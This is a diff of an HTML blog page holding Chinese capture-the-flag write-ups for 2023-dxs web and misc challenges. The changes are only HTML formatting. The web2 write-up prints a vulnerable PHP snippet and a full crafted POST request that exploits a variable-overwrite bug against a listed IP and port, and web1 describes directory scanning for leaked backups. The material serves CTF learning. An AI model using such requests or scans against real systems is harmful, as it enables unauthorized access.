@@ -469,9 +469,9 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="2023-dxs-web1"><a href="#2023-dxs-web1" class="headerlink" title="2023-dxs-web1"></a>2023-dxs-web1</h1><p>网页标题提示信息收集，按右键发现被禁用，f12查看源代码发现javascript代码，抓包对HTTP报头分析，未发现flag信息，利用御剑工具对网站目录进行后台扫描，发现<a href="http://www.zip以及index.php等文件,解压www.zip发现f1oog.txt文件,在地址栏访问floog.txt得到flag值/">www.zip以及index.php等文件，解压www.zip发现f1oog.txt文件，在地址栏访问floog.txt得到flag值</a><br><img src="https://article.biliimg.com/bfs/article/f812ca43cbd7a15be6977d4af3e3d505290349942.png"></p>
-<h1 id="2023-dxs-web2"><a href="#2023-dxs-web2" class="headerlink" title="2023-dxs-web2"></a>2023-dxs-web2</h1><p>根据提示,访问&#x2F;index.php.bak<br>即可得到bak文件<br>更改后缀之后打开添加<?php和?></p>
-<pre><code class="php">&lt;?php
+          <h1 id="2023-dxs-web1"><a href="#2023-dxs-web1" class="headerlink" title="2023-dxs-web1"></a>2023-dxs-web1</h1><p>网页标题提示信息收集，按右键发现被禁用，f12查看源代码发现javascript代码，抓包对HTTP报头分析，未发现flag信息，利用御剑工具对网站目录进行后台扫描，发现www.zip以及index.php等文件，解压www.zip发现f1oog.txt文件，在地址栏访问floog.txt得到flag值<br><img src="https://article.biliimg.com/bfs/article/f812ca43cbd7a15be6977d4af3e3d505290349942.png" alt=""></p>
+<h1 id="2023-dxs-web2"><a href="#2023-dxs-web2" class="headerlink" title="2023-dxs-web2"></a>2023-dxs-web2</h1><p>根据提示,访问/index.php.bak<br>即可得到bak文件<br>更改后缀之后打开添加&lt;?php和?&gt;</p>
+<pre><code class="lang-php">&lt;?php
 include &quot;flag.php&quot;;
 $_403 = &quot;Access Denied&quot;;
 $_200 = &quot;Welcome Admin&quot;;
@@ -489,7 +489,7 @@ echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;
 die($_200);
 ?&gt;
 </code></pre>
-<p>分析代码可知，存在变量覆盖漏洞，而又要输出flag，则让$_200&#x3D;$flag 然后用变量覆盖问题传入flag&#x3D;xxxxx,则满足了 $_POST[“flag”] !&#x3D;&#x3D; $flag 而$_200的值是正确的flag</p>
+<p>分析代码可知，存在变量覆盖漏洞，而又要输出flag，则让$_200=$flag 然后用变量覆盖问题传入flag=xxxxx,则满足了 $_POST[“flag”] !== $flag 而$_200的值是正确的flag</p>
 <pre><code>POST /index.php?_200=flag&amp;_403=flag HTTP/1.1
 Host: 111.74.9.131:10017
 Cache-Control: max-age=0
@@ -502,9 +502,8 @@ Content-Disposition: form-data; name=&quot;flag&quot;
 
 dsadasdsadaas
 ----WebKitFormBoundaryE19zNvXGzXaLvS5C
-</code></pre>
-<p><img src="https://article.biliimg.com/bfs/article/64f006997fe056348405642788f60e6c290349942.png"></p>
-<h1 id="2023-dxs-misc2"><a href="#2023-dxs-misc2" class="headerlink" title="2023-dxs-misc2"></a>2023-dxs-misc2</h1><p>下载文件后发现是一张jpg用010editor打开之后发现拼接了rar，丢入kali 用binwalk -e 命令，分解rar，发现是一个加密文件，再看文件名是数字.字母<br>拼接后是base64编码解码后即可得到答案<br><img src="https://article.biliimg.com/bfs/article/9c5c936ee82e21ed1a4d6863777ac712290349942.png"></p>
+</code></pre><p><img src="https://article.biliimg.com/bfs/article/64f006997fe056348405642788f60e6c290349942.png" alt=""></p>
+<h1 id="2023-dxs-misc2"><a href="#2023-dxs-misc2" class="headerlink" title="2023-dxs-misc2"></a>2023-dxs-misc2</h1><p>下载文件后发现是一张jpg用010editor打开之后发现拼接了rar，丢入kali 用binwalk -e 命令，分解rar，发现是一个加密文件，再看文件名是数字.字母<br>拼接后是base64编码解码后即可得到答案<br><img src="https://article.biliimg.com/bfs/article/9c5c936ee82e21ed1a4d6863777ac712290349942.png" alt=""></p>
 
         </div>
         <!-- .entry-content -->
